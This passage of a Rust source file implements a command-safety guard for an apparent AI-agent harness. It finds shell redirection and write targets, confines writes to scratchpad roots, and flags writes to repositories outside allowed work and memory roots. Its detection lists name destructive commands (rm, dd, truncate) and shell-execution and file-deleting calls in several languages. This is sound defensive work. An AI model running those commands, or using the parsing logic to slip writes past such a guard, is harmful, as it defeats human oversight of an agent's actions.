//! Writes rules for command safety.

use super::*;

/// A target is confined only when literal `/dev/null` or lexically
/// beneath a scratchpad root; dynamic expansion cannot prove confinement
/// (#168).
pub(super) fn target_is_confined(target: &str, scratchpad_roots: &[String]) -> bool {
    if target == "/dev/null" {
        return true;
    }
    if target.contains(['$', '`', '~', '*', '?']) {
        return false;
    }
    // Reject `..` before prefix checks: lexical parent traversal can escape
    // an otherwise matching scratchpad root.
    if target.contains("..") {
        return false;
    }
    let normalized = target.replace('\\', "/");
    // Require an exact root or root-plus-separator boundary; a sibling with
    // the same text prefix is not confined.
    scratchpad_roots.iter().any(|root| {
        !root.is_empty() && (normalized == *root || normalized.starts_with(&format!("{root}/")))
    })
}

/// Find unquoted output redirection targets, including fd-prefixed forms.
/// Skip input/descriptor forms and inspect substitutions recursively; an
/// output operator without a resolvable target returns None (#168, #345).
pub(super) fn scan_redirection_targets(segment: &str) -> Option<Vec<String>> {
    scan_redirection_targets_at_depth(segment, 0)
}

fn scan_redirection_targets_at_depth(segment: &str, depth: usize) -> Option<Vec<String>> {
    if depth >= MAX_STRUCTURAL_DEPTH {
        return None;
    }
    let chars: Vec<char> = segment.chars().collect();
    let substitutions = command_substitution_spans(segment);
    let mut substitution_index = 0usize;
    let mut targets = Vec::new();
    for (_, _, body) in &substitutions {
        targets.extend(scan_redirection_targets_at_depth(body, depth + 1)?);
    }
    let mut quote: Option<char> = None;
    let mut escaped = false;
    let mut i = 0usize;
    while i < chars.len() {
        while substitutions
            .get(substitution_index)
            .is_some_and(|(_, end, _)| *end <= i)
        {
            substitution_index += 1;
        }
        let c = chars[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        if c == '\\' && quote != Some('\'') {
            escaped = true;
            i += 1;
            continue;
        }
        if let Some((start, end, _)) = substitutions.get(substitution_index)
            && *start <= i
        {
            substitution_index += 1;
            i = *end;
            continue;
        }
        if let Some(active) = quote {
            if c == active {
                quote = None;
            }
            i += 1;
            continue;
        }
        if matches!(c, '\'' | '"' | '`') {
            quote = Some(c);
            i += 1;
            continue;
        }

        // `<(...)` and `>(...)` are process substitutions, not file
        // redirects. Their bodies are still shell code and may contain a
        // genuine output redirect of their own.
        if matches!(c, '<' | '>') && chars.get(i + 1) == Some(&'(') {
            if let Some(end) = command_substitution_end(&chars, i + 2, depth) {
                let body: String = chars[i + 2..end].iter().collect();
                targets.extend(scan_redirection_targets_at_depth(&body, depth + 1)?);
                i = end + 1;
            } else {
                i += 2;
            }
            continue;
        }

        let digits_end = if c.is_ascii_digit() {
            let mut end = i + 1;
            while chars.get(end).is_some_and(char::is_ascii_digit) {
                end += 1;
            }
            Some(end)
        } else {
            None
        };
        let is_digit_prefixed_input = digits_end.is_some_and(|end| chars.get(end) == Some(&'<'));
        if c == '<' || is_digit_prefixed_input {
            i = digits_end.unwrap_or(i) + 1;
            continue;
        }

        let is_digit_prefixed_redirect = digits_end.is_some_and(|end| chars.get(end) == Some(&'>'));
        let is_amp_redirect = c == '&' && chars.get(i + 1) == Some(&'>');
        if !(c == '>' || is_amp_redirect || is_digit_prefixed_redirect) {
            i += 1;
            continue;
        }
        let mut j = if is_digit_prefixed_redirect {
            digits_end.unwrap_or(i) + 1
        } else if is_amp_redirect {
            i + 2
        } else {
            i + 1
        };
        if chars.get(j) == Some(&'>') || chars.get(j) == Some(&'|') {
            j += 1;
        }
        while chars.get(j).is_some_and(|c| c.is_whitespace()) {
            j += 1;
        }

        // `>&N`, `N>&M`, and `>&-` duplicate or close a descriptor. The
        // operand ends at a shell word boundary, including a command
        // substitution's closing `)`. A non-descriptor word after `>&` is
        // Bash's legacy spelling of `&>word`, however, and still names a real
        // output path; advance past the ampersand so it is collected below.
        if chars.get(j) == Some(&'&') {
            let mut operand_start = j + 1;
            while chars.get(operand_start).is_some_and(|c| c.is_whitespace()) {
                operand_start += 1;
            }
            let mut descriptor_end = operand_start;
            if chars.get(descriptor_end) == Some(&'-') {
                descriptor_end += 1;
            } else {
                while chars.get(descriptor_end).is_some_and(char::is_ascii_digit) {
                    descriptor_end += 1;
                }
            }
            let is_descriptor = descriptor_end > operand_start
                && chars.get(descriptor_end).is_none_or(|c| {
                    c.is_whitespace() || matches!(c, ';' | '&' | '|' | '<' | '>' | '(' | ')')
                });
            if is_descriptor {
                i = descriptor_end;
                continue;
            }
            j = operand_start;
        }

        let target_start = j;
        let mut target_quote = None;
        while let Some(&c) = chars.get(j) {
            if let Some(active) = target_quote {
                if c == active {
                    target_quote = None;
                }
            } else if matches!(c, '\'' | '"') {
                target_quote = Some(c);
            } else if c.is_whitespace() || matches!(c, ';' | '&' | '|' | '<' | '>' | '(' | ')') {
                break;
            }
            j += 1;
        }
        if target_quote.is_some() {
            return None;
        }
        let target: String = chars[target_start..j].iter().collect();
        if target.is_empty() {
            // A dangling operator with nothing after it at all -- ambiguous.
            return None;
        }
        targets.push(sql_tokens(&target)?.into_iter().next()?);
        i = j;
    }
    Some(targets)
}

/// Resolve one segment's write targets; dangling redirections and
/// dynamic `tee` paths yield no safe conclusion (#168).
pub(super) fn segment_redirect_targets(segment: &str) -> Option<Vec<String>> {
    let mut targets = scan_redirection_targets(segment)?;
    if let Some(tokens) = path_command_tokens(segment)
        && let Some(first) = tokens.first()
        && sql_program_name(first) == "tee"
    {
        for token in tokens.iter().skip(1) {
            if token.starts_with('-') {
                continue;
            }
            if token.contains(['$', '`']) {
                return None;
            }
            targets.push(token.clone());
        }
    }
    Some(targets)
}

/// Shell redirects belong to the shell, not to tee/mkdir's path operands.
/// Inspect raw words so a quoted filename such as `'>log'` stays an argument.
pub(super) fn path_command_tokens(segment: &str) -> Option<Vec<String>> {
    sql_tokens(&path_command_raw_words(segment)?.join(" "))
}

/// [`path_command_tokens`]' words with their quotes still on, redirects
/// removed.
pub(super) fn path_command_raw_words(segment: &str) -> Option<Vec<String>> {
    let quoted = tokenize_quoted(&segment.chars().collect::<Vec<_>>());
    let mut words = quoted.iter();
    let mut tokens = Vec::new();
    while let Some(word) = words.next() {
        let raw = word.text.as_str();
        let redirect = raw.trim_start_matches(|c: char| c.is_ascii_digit());
        let redirect = redirect.strip_prefix('&').unwrap_or(redirect);
        if redirect.starts_with(['<', '>']) {
            let target = redirect.trim_start_matches(['<', '>', '|']);
            if target.is_empty() {
                words.next()?;
            }
            continue;
        }
        tokens.push(raw.to_string());
    }
    Some(tokens)
}

pub(super) fn segment_write_targets(segment: &str) -> Option<Vec<String>> {
    let mut targets = segment_redirect_targets(segment)?;
    let Some(tokens) = path_command_tokens(segment) else {
        return Some(targets);
    };
    let Some(first) = tokens.first() else {
        return Some(targets);
    };
    let program = sql_program_name(first);
    if !is_file_access_program(&program) {
        return Some(targets);
    }
    match program.as_str() {
        "cp" | "mv" | "ln" | "install" | "rsync" => {
            if let Some(target) = tokens
                .iter()
                .enumerate()
                .skip(1)
                .find_map(|(i, _)| {
                    option_value(&tokens, i, &["-t", "--target-directory"])
                        .filter(|_| program != "rsync")
                })
                .or_else(|| last_non_flag_argument(&tokens))
            {
                targets.push(target.to_string());
            }
        }
        "touch" | "mkdir" | "truncate" | "rm" => {
            let value_flags: &[&str] = match program.as_str() {
                "touch" => &["-t", "-d", "-r", "--date", "--reference"],
                "mkdir" => &["-m", "--mode"],
                "truncate" => &["-s", "-r", "--size", "--reference"],
                _ => &[],
            };
            let mut i = 1;
            let mut options = true;
            while i < tokens.len() {
                let token = &tokens[i];
                if options && token == "--" {
                    options = false;
                } else if options && value_flags.contains(&token.as_str()) {
                    i += 1;
                } else if !options || !token.starts_with('-') {
                    targets.push(token.clone());
                }
                i += 1;
            }
        }
        "sed" if tokens[1..].iter().any(|t| is_sed_perl_inplace_flag(t)) => {
            targets.extend(sed_perl_inplace_targets(&program, &tokens));
        }
        "dd" => targets.extend(
            tokens[1..]
                .iter()
                .filter_map(|t| t.strip_prefix("of=").map(str::to_string)),
        ),
        _ => {}
    }
    if targets.iter().any(|target| target.contains(['$', '`'])) {
        return None;
    }
    Some(targets)
}

/// Resolve only literals established by earlier standalone assignments or
/// exports. Never follow aliases, ambient variables, conditional assignments,
/// subshells, or commands that can change the calling shell's variables.
/// Keep the raw segment alongside it: policy rules always see the original.
pub(super) fn literal_write_segments(command: &str) -> Vec<(String, String)> {
    // A function or trap can mutate a variable after its definition was
    // scanned. Check the WHOLE command before trusting any assignment; a
    // forward-only map cannot model deferred execution or shell scope.
    if !literal_assignments_are_stable(command) {
        return split_segments(command)
            .into_iter()
            .map(|segment| (segment.clone(), segment))
            .collect();
    }
    let mut literals = std::collections::HashMap::new();
    let mut remaining = command;
    let mut previous_separator = "";
    let mut segments = Vec::new();
    for segment in split_segments(command) {
        remaining = &remaining[segment.len()..];
        let tail = remaining.trim_start_matches([';', '\n', '&', '|']);
        let separator = &remaining[..remaining.len() - tail.len()];
        remaining = tail;
        let tokens = tokenize_quoted(&segment.chars().collect::<Vec<_>>());
        let first = tokens.first().map(|t| t.text.as_str()).unwrap_or("");
        let resolved = substitute_literal_variables(&segment, &literals);
        let assignments = if first == "export" {
            &tokens[1..]
        } else {
            &tokens[..]
        };
        if !assignments.is_empty()
            && assignments
                .iter()
                .all(|t| is_shell_identifier_assignment(&t.text))
        {
            for token in assignments {
                let (name, value) = token.text.split_once('=').unwrap_or_default();
                literals.remove(name);
                if previous_separator.contains(['&', '|']) || separator.contains(['&', '|']) {
                    continue;
                }
                let Some(values) = sql_tokens(value) else {
                    continue;
                };
                if let [value] = values.as_slice()
                    && !value.contains(['$', '`', '*', '?', '[', '~', '\\'])
                {
                    literals.insert(name.to_string(), value.clone());
                }
            }
        }
        segments.push((segment, resolved));
        previous_separator = separator;
    }
    segments
}

/// Only a single assignment per name in a simple command list is resolved.
/// This is deliberately a smaller language than shell: uncertain syntax
/// leaves expansions intact for the existing approval path.
fn literal_assignments_are_stable(command: &str) -> bool {
    if !literal_assignment_syntax_is_simple(command) {
        return false;
    }
    let mut assigned = std::collections::HashSet::new();
    for segment in split_segments(command) {
        let Some(tokens) = sql_tokens(&segment) else {
            return false;
        };
        for token in &tokens {
            if is_shell_identifier_assignment(token) {
                let (name, _) = token.split_once('=').unwrap_or_default();
                if !assigned.insert(name.to_string()) {
                    return false;
                }
            }
        }
        let start = usize::from(tokens.first().is_some_and(|token| token == "export"));
        if tokens.len() > start
            && tokens[start..]
                .iter()
                .all(|token| is_shell_identifier_assignment(token))
        {
            // An assignment is not an executable path. Normalizing its
            // program basename could truncate a quoted directory value.
            continue;
        }
        // Include the original head (for/select) as well as normalized
        // executable heads (e.g. `builtin read` or `command eval`). Leading
        // shell redirects cannot hide a variable-mutating builtin either.
        for candidate in std::iter::once(segment.clone()).chain(normalize_segments(&segment)) {
            let Some(words) = path_command_tokens(&candidate) else {
                return false;
            };
            let Some(program) = words.first() else {
                continue;
            };
            if SHELL_STRUCTURAL_KEYWORDS.contains(&program.as_str())
                || program.contains(['$', '{', '}'])
                || matches!(
                    program.as_str(),
                    "select"
                        | "builtin"
                        | "command"
                        | "time"
                        | "!"
                        | "noglob"
                        | "nocorrect"
                        | "function"
                        | "trap"
                        | "eval"
                        | "source"
                        | "."
                        | "read"
                        | "unset"
                        | "declare"
                        | "local"
                        | "typeset"
                        | "readonly"
                        | "let"
                        | "mapfile"
                        | "readarray"
                        | "getopts"
                        | "set"
                        | "alias"
                        | "unalias"
                        | "autoload"
                        | "enable"
                )
                || (program == "printf" && words.iter().any(|word| word.starts_with("-v")))
                || (program.contains('=') && !is_shell_identifier_assignment(program))
                || (program == "export"
                    && !words[1..]
                        .iter()
                        .all(|word| is_shell_identifier_assignment(word)))
            {
                return false;
            }
        }
    }
    true
}

/// Ignore quoted data such as grep patterns and printf formats, while
/// rejecting executable substitutions, functions, arithmetic and escaped
/// command names. Double-quoted expansions still execute in the shell.
fn literal_assignment_syntax_is_simple(command: &str) -> bool {
    let chars: Vec<_> = command.chars().collect();
    let mut quote = None;
    let mut escaped = false;
    for (i, &c) in chars.iter().enumerate() {
        if escaped {
            escaped = false;
            continue;
        }
        if quote == Some('\'') {
            if c == '\'' {
                quote = None;
            }
            continue;
        }
        if c == '\\' {
            if quote.is_none() {
                return false;
            }
            escaped = true;
            continue;
        }
        if quote == Some(c) {
            quote = None;
            continue;
        }
        if quote.is_none() && matches!(c, '\'' | '"') {
            quote = Some(c);
            continue;
        }
        if c == '`' || (quote.is_none() && matches!(c, '(' | ')')) {
            return false;
        }
        if c == '$' {
            if chars.get(i + 1) == Some(&'(') {
                return false;
            }
            if chars.get(i + 1) == Some(&'{') {
                let name: String = chars[i + 2..].iter().take_while(|&&c| c != '}').collect();
                if !is_shell_identifier_assignment(&format!("{name}=")) {
                    return false;
                }
            }
        }
    }
    quote.is_none() && !escaped
}

fn substitute_literal_variables(
    segment: &str,
    literals: &std::collections::HashMap<String, String>,
) -> String {
    let chars: Vec<char> = segment.chars().collect();
    let mut out = String::new();
    let mut quote = None;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '\\' && quote != Some('\'') {
            out.push(c);
            i += 1;
            if let Some(&escaped) = chars.get(i) {
                out.push(escaped);
                i += 1;
            }
            continue;
        }
        if c == '$' && quote != Some('\'') {
            let braced = chars.get(i + 1) == Some(&'{');
            let start = i + if braced { 2 } else { 1 };
            let mut end = start;
            while chars
                .get(end)
                .is_some_and(|c| c.is_ascii_alphanumeric() || *c == '_')
            {
                end += 1;
            }
            let name: String = chars[start..end].iter().collect();
            if (!braced || chars.get(end) == Some(&'}'))
                && let Some(value) = literals.get(&name)
                && !value.contains(['"', '\\'])
                && (quote == Some('"')
                    || !value
                        .chars()
                        .any(|c| c.is_whitespace() || ";&|<>()'".contains(c)))
            {
                out.push_str(value);
                i = end + usize::from(braced);
                continue;
            }
        }
        if quote == Some(c) {
            quote = None;
        } else if quote.is_none() && matches!(c, '\'' | '"') {
            quote = Some(c);
        }
        out.push(c);
        i += 1;
    }
    out
}

/// Prove every actual write target in a command is confined. Return None
/// for unknown targets or no targets: vacuous success would allow an
/// arbitrary non-writing command through the scratchpad carve-out (#168).
pub(crate) fn write_targets_confined(command: &str, scratchpad_roots: &[String]) -> Option<bool> {
    if scratchpad_roots.is_empty() {
        return None;
    }
    let sanitized = redact_single_quoted_heredocs(command);
    let mut confined = true;
    let mut saw_any_target = false;
    for (_, segment) in literal_write_segments(&sanitized) {
        let mut targets = segment_redirect_targets(&segment)?;
        saw_any_target |= !targets.is_empty();
        targets.extend(mkdir_write_targets(&segment)?);
        for target in &targets {
            if target.contains(['$', '`']) {
                return None;
            }
            if !target_is_confined(target, scratchpad_roots) {
                confined = false;
            }
        }
    }
    if !saw_any_target {
        return None;
    }
    Some(confined)
}

// -- orchestrator repo-write guard (issues #328/#334) ---------------------

/// Mask heredoc openers before redirect scanning so `<<` does not look
/// like a dangling input redirect and hide an earlier real write target. The
/// redacted-body placeholder's closing `>` would read as an output redirect
/// onto the delimiter inside a `$(...)` (#887), so it is blanked too.
fn neutralize_heredoc_operator(segment: &str) -> String {
    let segment = segment.replace(super::shell::OPAQUE_HEREDOC_BODY_PLACEHOLDER, " ");
    let chars: Vec<char> = segment.chars().collect();
    let mut out = String::with_capacity(chars.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '<' && chars.get(i + 1) == Some(&'<') {
            out.push(' ');
            out.push(' ');
            i += 2;
            while chars.get(i) == Some(&'<') {
                out.push(' ');
                i += 1;
            }
            continue;
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

/// Resolve a write target through existing filesystem prefixes. Dynamic
/// expansion and `~` cannot be proven absolute; `/dev/null` is not a write.
pub(super) fn resolve_repo_write_target(target: &str, cwd: &str) -> Option<String> {
    if target.contains(['$', '`']) || target == "/dev/null" {
        return None;
    }
    let normalized = target.replace('\\', "/");
    let is_absolute = normalized.starts_with('/')
        || normalized.starts_with('~')
        || (normalized.as_bytes().get(1) == Some(&b':')
            && matches!(normalized.as_bytes().get(2), Some(b'/')));
    let combined = if is_absolute {
        normalized
    } else {
        format!("{cwd}/{normalized}")
    };
    let combined = if Path::new(&combined).is_absolute() {
        super::pathutil::canonicalize_with_missing_tail(Path::new(&combined))?
            .to_string_lossy()
            .replace('\\', "/")
    } else {
        combined
    };
    // `std::fs::canonicalize` returns an extended-length `\\?\C:\...`
    // path on Windows. After separator normalization that is `//?/C:/...`;
    // treating it as an ordinary slash-rooted path turns it into the invalid
    // `/?/C:/...` and makes the repository ancestor walk miss every write.
    // Strip the verbatim prefix while preserving UNC's double-slash root.
    let combined = if let Some(rest) = combined.strip_prefix("//?/UNC/") {
        format!("//{rest}")
    } else if let Some(rest) = combined.strip_prefix("//?/") {
        rest.to_string()
    } else {
        combined
    };
    if let Some(rest) = combined.strip_prefix("//") {
        Some(format!(
            "//{}",
            resolve_lexical_path_components(rest).join("/")
        ))
    } else if let Some(rest) = combined.strip_prefix('/') {
        Some(format!(
            "/{}",
            resolve_lexical_path_components(rest).join("/")
        ))
    } else if combined.as_bytes().get(1) == Some(&b':') {
        let (drive, rest) = combined.split_at(2);
        let rest = rest.strip_prefix('/').unwrap_or(rest);
        Some(format!(
            "{drive}/{}",
            resolve_lexical_path_components(rest).join("/")
        ))
    } else {
        Some(resolve_lexical_path_components(&combined).join("/"))
    }
}

/// Report a repository write only for a proven absolute target in its
/// nearest git repository, outside that repository's own allowed work and
/// memory roots. Resolve per target, not against the launch repo; preserve
/// the caller's original path in the report (#334).
fn repo_write_violation(
    target: &str,
    cwd: &str,
    repo_root_of: &dyn Fn(&str) -> Option<String>,
    env: EnvLookup<'_>,
) -> Option<String> {
    let resolved = resolve_repo_write_target(target, cwd)?;
    let is_filesystem_absolute = resolved.starts_with('/')
        || (resolved.as_bytes().get(1) == Some(&b':')
            && matches!(resolved.as_bytes().get(2), Some(b'/')));
    if !is_filesystem_absolute {
        return None;
    }
    if super::lifecycle::target_is_under_harness_home(std::path::Path::new(&resolved), env) {
        return None;
    }
    let root = repo_root_of(&resolved)?;
    let allowed_roots = [format!("{root}/.zirv/work"), format!("{root}/.zirv/memory")];
    let under_allowed = allowed_roots
        .iter()
        .any(|allowed| resolved == *allowed || resolved.starts_with(&format!("{allowed}/")));
    if under_allowed {
        None
    } else {
        Some(target.to_string())
    }
}

/// Find the nearest git root from a target's parent, including `.git`
/// files in linked worktrees; the write target may not exist yet (#334).
pub(super) fn filesystem_repo_root_of(path: &str) -> Option<String> {
    let mut dir = std::path::Path::new(path).parent()?.to_path_buf();
    loop {
        if dir.join(".git").exists() {
            return Some(
                dir.to_string_lossy()
                    .replace('\\', "/")
                    .trim_end_matches('/')
                    .to_string(),
            );
        }
        if !dir.pop() {
            return None;
        }
    }
}

/// Split segments with pipe markers so patch-application exemptions can
/// distinguish pipelines from other shell joins (#334).
pub(super) fn split_segments_with_pipe_marker(command: &str) -> Vec<(String, bool)> {
    tokenize_segments(command)
}

/// Identify `git apply`/`git am`/`patch` as arbitrary worktree writes;
/// parse git global flags before the action so they cannot hide it (#334).
fn git_apply_program_label(program: &str, subcommand: Option<&str>) -> Option<&'static str> {
    match (program, subcommand) {
        ("git", Some("apply")) => Some("<git apply>"),
        ("git", Some("am")) => Some("<git am>"),
        ("patch", _) => Some("<patch>"),
        _ => None,
    }
}

/// Only diff-producing git actions qualify as upstream for piped
/// `git apply`/`git am`; other git output is not a proven patch (#334).
const GIT_DIFF_PRODUCING_ACTIONS: &[&str] = &[
    "diff",
    "show",
    "format-patch",
    "diff-tree",
    "diff-index",
    "log",
];

/// Whether `token` is a `sed`/`perl` in-place-edit flag: `-i`, `-i<suffix>`
/// (`-i.bak`), `--in-place[=<suffix>]`, or a clustered short-flag group
/// containing `i` (`-pi`, `-pie`, `-ni`).
pub(super) fn is_sed_perl_inplace_flag(token: &str) -> bool {
    if token == "--in-place" || token.starts_with("--in-place=") {
        return true;
    }
    if token.starts_with("--") || !token.starts_with('-') || token.len() < 2 {
        return false;
    }
    token[1..].contains('i')
}

/// The file-argument positionals a `sed`/`perl` in-place edit (`program` at
/// `tokens[0]`) would write to: every non-flag argument that is not the
/// script/expression consumed by an `-e`/`-f` flag, and -- for `sed` with
/// no `-e`/`-f` anywhere on the line -- not the first positional either
/// (its own implicit script).
pub(super) fn sed_perl_inplace_targets(program: &str, tokens: &[String]) -> Vec<String> {
    // `-e`/`-f` and clusters ending in `e` (`-pe`, `-ne`) take the script next.
    let is_script_flag = |t: &str| {
        matches!(t, "-e" | "-f" | "--expression" | "--file")
            || (t.starts_with('-')
                && !t.starts_with("--")
                && t.len() > 2
                && t.ends_with('e')
                && t[1..].chars().all(|c| c.is_ascii_alphabetic() && c != 'i'))
    };
    let has_e_or_f = tokens[1..]
        .iter()
        .any(|t| is_script_flag(t) || t.starts_with("--expression=") || t.starts_with("--file="));
    let mut awaiting_implicit_script = program == "sed" && !has_e_or_f;
    let mut targets = Vec::new();
    let mut i = 1;
    while i < tokens.len() {
        let token = &tokens[i];
        if is_script_flag(token) {
            i += 2;
            continue;
        }
        // BSD `sed -i ''`: the empty suffix operand is not a file.
        if program == "sed" && token == "-i" && tokens.get(i + 1).is_some_and(String::is_empty) {
            i += 2;
            continue;
        }
        if token.starts_with('-') {
            i += 1;
            continue;
        }
        if awaiting_implicit_script {
            awaiting_implicit_script = false;
            i += 1;
            continue;
        }
        targets.push(token.clone());
        i += 1;
    }
    targets
}

/// The last non-flag argument of `tokens` (`cp`/`mv`/`install`/`rsync`/`ln`
/// all write to their final positional).
fn last_non_flag_argument(tokens: &[String]) -> Option<&str> {
    tokens[1..]
        .iter()
        .rfind(|t| !t.starts_with('-'))
        .map(String::as_str)
}

/// The code argument following a `-c`/`-e` flag among `tokens`, for an
/// inline interpreter invocation (`python3 -c "..."`, `node -e "..."`).
fn inline_interpreter_code(tokens: &[String]) -> Option<&str> {
    let mut iter = tokens[1..].iter();
    while let Some(token) = iter.next() {
        let cluster = token.starts_with('-')
            && !token.starts_with("--")
            && token.len() > 1
            && token.chars().skip(1).all(|c| c.is_ascii_alphabetic())
            && token.ends_with(['c', 'e', 'p', 'r']);
        if cluster || matches!(token.as_str(), "--eval" | "--print") {
            return iter.next().map(String::as_str);
        }
    }
    None
}

/// An inline-interpreter call that writes or runs a command. `receiver`/`args`
/// say which string literals of the call name its target path(s); `gate`, when
/// non-empty, is a list of spellings one of which must appear in the code for
/// an otherwise ambiguous name (`.replace(`) to count.
struct InlinePrimitive {
    pattern: &'static str,
    gate: &'static [&'static str],
    receiver: bool,
    args: bool,
}

const PATH_GATE: &[&str] = &["Path(", "pathlib", "fs.", "fs/promises", "promises", "fsp."];

const fn call(pattern: &'static str) -> InlinePrimitive {
    InlinePrimitive {
        pattern,
        gate: &[],
        receiver: false,
        args: true,
    }
}

const fn method(pattern: &'static str, gate: &'static [&'static str]) -> InlinePrimitive {
    InlinePrimitive {
        pattern,
        gate,
        receiver: true,
        args: true,
    }
}

/// Filesystem-writing calls of python, node, ruby and php. Qualified names
/// only, so `list.remove(x)` and `"a".replace(..)` stay reads.
const INLINE_FS_PRIMITIVES: &[InlinePrimitive] = &[
    call("os.rename("),
    call("os.renames("),
    call("os.replace("),
    call("os.remove("),
    call("os.unlink("),
    call("os.truncate("),
    call("os.makedirs("),
    call("os.mkdir("),
    call("os.rmdir("),
    call("os.removedirs("),
    call("os.symlink("),
    call("os.link("),
    call("os.chmod("),
    call("os.chown("),
    call("renameSync("),
    call("copyFileSync("),
    call("cpSync("),
    call("rmSync("),
    call("rmdirSync("),
    call("unlinkSync("),
    call("mkdirSync("),
    call("appendFileSync("),
    call("writeFileSync("),
    call("truncateSync("),
    call("symlinkSync("),
    call("linkSync("),
    call("chmodSync("),
    call("createWriteStream("),
    call("writeFile("),
    call("appendFile("),
    call("File.write("),
    call("File.binwrite("),
    call("IO.write("),
    call("File.delete("),
    call("File.rename("),
    call("File.unlink("),
    call("Dir.mkdir("),
    call("file_put_contents("),
    InlinePrimitive {
        pattern: ".write_text(",
        gate: &[],
        receiver: true,
        args: false,
    },
    InlinePrimitive {
        pattern: ".write_bytes(",
        gate: &[],
        receiver: true,
        args: false,
    },
    method(".unlink(", &[]),
    method(".touch(", &[]),
    method(".mkdir(", &[]),
    method(".rmdir(", &[]),
    method(".chmod(", &[]),
    method(".symlink_to(", &[]),
    method(".hardlink_to(", &[]),
    method(".rename(", PATH_GATE),
    method(".replace(", PATH_GATE),
    method(".rm(", PATH_GATE),
    method(".cp(", PATH_GATE),
    method(".copyFile(", PATH_GATE),
    method(".truncate(", PATH_GATE),
];

/// Module prefixes whose every function is a filesystem mutation
/// (`shutil.rmtree(`, `FileUtils.mv(`); `fileinput.` only edits in place.
const INLINE_FS_PREFIXES: &[(&str, &str)] = &[
    ("shutil.", ""),
    ("FileUtils.", ""),
    ("fileinput.", "inplace"),
];

/// Calls that run a shell command line or program from a string or list.
const INLINE_SHELL_PRIMITIVES: &[InlinePrimitive] = &[
    call("os.system("),
    call("os.popen("),
    call("subprocess.run("),
    call("subprocess.call("),
    call("subprocess.check_call("),
    call("subprocess.check_output("),
    call("subprocess.Popen("),
    call("subprocess.getoutput("),
    call("subprocess.getstatusoutput("),
    call("execSync("),
    call("execFileSync("),
    call("spawnSync("),
    call("shell_exec("),
    call("system("),
    InlinePrimitive {
        pattern: "exec(",
        gate: &["child_process"],
        receiver: false,
        args: true,
    },
    InlinePrimitive {
        pattern: "execFile(",
        gate: &["child_process"],
        receiver: false,
        args: true,
    },
    InlinePrimitive {
        pattern: "spawn(",
        gate: &["child_process"],
        receiver: false,
        args: true,
    },
];

/// Open-style calls that only mean a write when given a write mode -- an
/// `open('f').read()` is not a write.
const INLINE_OPEN_PRIMITIVES: &[&str] = &["open(", "File.open(", "fopen("];

/// String literals that are modes, encodings or module names, never a path.
const NON_PATH_LITERALS: &[&str] = &[
    "r",
    "w",
    "a",
    "x",
    "rb",
    "wb",
    "ab",
    "xb",
    "rt",
    "wt",
    "at",
    "r+",
    "w+",
    "a+",
    "x+",
    "rb+",
    "wb+",
    "ab+",
    "utf-8",
    "utf8",
    "utf-16",
    "ascii",
    "latin-1",
    "latin1",
    "fs",
    "fs/promises",
    "node:fs",
    "node:fs/promises",
    "os",
    "path",
    "child_process",
    "node:child_process",
    "shutil",
    "pathlib",
];

/// How deep wrapper, `eval`, `xargs` and interpreter-string recursion goes
/// before the guard gives up and treats the nesting itself as a write.
const SEAT_GUARD_DEPTH_LIMIT: usize = 4;

/// The string literals of `text` (single, double, backtick and triple
/// quoted), contents only, in order. An unterminated literal ends the scan.
fn string_literals(text: &str) -> Vec<String> {
    let chars: Vec<char> = text.chars().collect();
    let mut literals = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        let quote = chars[i];
        if !matches!(quote, '\'' | '"' | '`') {
            i += 1;
            continue;
        }
        let triple = chars.get(i + 1) == Some(&quote) && chars.get(i + 2) == Some(&quote);
        let width = if triple { 3 } else { 1 };
        let mut j = i + width;
        let mut content = String::new();
        loop {
            let Some(&c) = chars.get(j) else {
                return literals;
            };
            if c == '\\' {
                if let Some(&next) = chars.get(j + 1) {
                    content.push(next);
                }
                j += 2;
                continue;
            }
            let closes = if triple {
                c == quote && chars.get(j + 1) == Some(&quote) && chars.get(j + 2) == Some(&quote)
            } else {
                c == quote
            };
            if closes {
                break;
            }
            content.push(c);
            j += 1;
        }
        literals.push(content);
        i = j + width;
    }
    literals
}

/// The text between the `(` at byte `open` of `code` and its matching `)`,
/// or to the end when unbalanced. Quotes and nesting are respected.
fn balanced_args(code: &str, open: usize) -> &str {
    let start = open + 1;
    let mut depth = 1usize;
    let mut quote: Option<char> = None;
    let mut escaped = false;
    for (offset, c) in code[start..].char_indices() {
        if escaped {
            escaped = false;
        } else if c == '\\' {
            escaped = true;
        } else if let Some(active) = quote {
            if c == active {
                quote = None;
            }
        } else if matches!(c, '\'' | '"' | '`') {
            quote = Some(c);
        } else if matches!(c, '(' | '[' | '{') {
            depth += 1;
        } else if matches!(c, ')' | ']' | '}') {
            depth -= 1;
            if depth == 0 {
                return &code[start..start + offset];
            }
        }
    }
    &code[start..]
}

/// Split `text` at commas that are outside quotes and brackets.
fn split_top_level(text: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut depth = 0usize;
    let mut quote: Option<char> = None;
    let mut escaped = false;
    let mut start = 0;
    for (index, c) in text.char_indices() {
        if escaped {
            escaped = false;
        } else if c == '\\' {
            escaped = true;
        } else if let Some(active) = quote {
            if c == active {
                quote = None;
            }
        } else if matches!(c, '\'' | '"' | '`') {
            quote = Some(c);
        } else if matches!(c, '(' | '[' | '{') {
            depth += 1;
        } else if matches!(c, ')' | ']' | '}') {
            depth = depth.saturating_sub(1);
        } else if c == ',' && depth == 0 {
            parts.push(text[start..index].trim());
            start = index + 1;
        }
    }
    parts.push(text[start..].trim());
    parts
}

/// The content of `text` when it is exactly one string literal
/// (`f"..."`/`b'...'` prefixes allowed).
fn single_literal(text: &str) -> Option<String> {
    let body = text
        .trim()
        .trim_start_matches(['f', 'F', 'b', 'B', 'r', 'R', 'u', 'U']);
    let quote = body
        .chars()
        .next()
        .filter(|c| matches!(c, '\'' | '"' | '`'))?;
    let literals = string_literals(body);
    (literals.len() == 1 && body.len() >= 2 && body.ends_with(quote))
        .then(|| literals.into_iter().next())
        .flatten()
}

/// Quote `words` into one shell command line.
fn join_shell_words(words: &[String]) -> String {
    words
        .iter()
        .map(|word| {
            let plain = !word.is_empty()
                && word
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || "/._-=:,+@%".contains(c));
            if plain {
                word.clone()
            } else {
                format!("'{}'", word.replace('\'', "'\\''"))
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// The shell command line a subprocess-style call runs, when it is spelled
